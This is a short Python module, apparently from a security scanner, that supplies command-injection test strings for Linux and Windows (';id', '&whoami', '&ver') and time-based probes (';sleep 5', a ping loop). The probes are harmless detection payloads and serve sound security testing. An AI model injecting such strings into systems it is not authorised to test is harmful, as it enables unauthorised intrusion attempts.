"""
===============================================================================
Command Injection Payload Provider
===============================================================================
"""

from __future__ import annotations

from itertools import chain
from typing import Iterable


LINUX_PAYLOADS = (

    ";id",

    "&&id",

    "|id",

    ";whoami",

)

WINDOWS_PAYLOADS = (

    "&whoami",

    "&&whoami",

    "|whoami",

    "&ver",

)

TIME_PAYLOADS = (

    ";sleep 5",

    "&&ping -n 6 127.0.0.1",

)

PAYLOAD_DATABASE = {

    "linux": LINUX_PAYLOADS,

    "windows": WINDOWS_PAYLOADS,

    "time": TIME_PAYLOADS,

}


class CommandInjectionPayloadProvider:

    def generate(self, vector) -> Iterable[str]:

        return chain.from_iterable(
            PAYLOAD_DATABASE.values()
        )